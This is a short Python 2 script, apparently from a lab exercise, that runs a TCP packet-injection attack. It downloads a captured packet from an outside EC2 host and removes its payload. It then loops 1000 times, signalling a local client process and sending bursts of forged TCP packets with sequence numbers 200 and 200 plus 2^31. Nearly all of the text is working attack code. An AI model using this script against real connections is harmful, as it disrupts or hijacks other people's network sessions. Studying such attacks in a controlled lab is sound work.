import urllib2
import copy
from scapy.all import *
import time
import os
import signal

PORT = 8004
URL = r'http://ec2-35-162-72-168.us-west-2.compute.amazonaws.com'
FILENAME = r'my_packet.pcap'
HTTP_GET_REQ = r"{0}:{1}/{2}".format(URL, PORT, FILENAME)
PCAP_TEMP = 'temp.pcap'

print 'get: ', HTTP_GET_REQ

file(PCAP_TEMP, 'wb').write(urllib2.urlopen(HTTP_GET_REQ).read())

pkt = copy.deepcopy(rdpcap(PCAP_TEMP)[0])

pkt.show2()

del pkt[Raw]

pkt.show2()

time.sleep(1)
print 'starting attack...'


def send_packet_with_seq(pkt, seq, num_to_send=100, delay=0.01):

	del pkt[TCP].chksum
	del pkt[IP].chksum

	pkt[TCP].seq = seq

	for _ in xrange(num_to_send):
		sendp(pkt, verbose=False)
		time.sleep(delay)

pid = int(file('client_pid.txt', 'r').read())
print pid

for _ in xrange(1000):
	os.kill(pid, signal.SIGUSR1)
	send_packet_with_seq(pkt, 200)
	send_packet_with_seq(pkt, 200 + 2**31)
	time.sleep(1)
	print 'sent....'

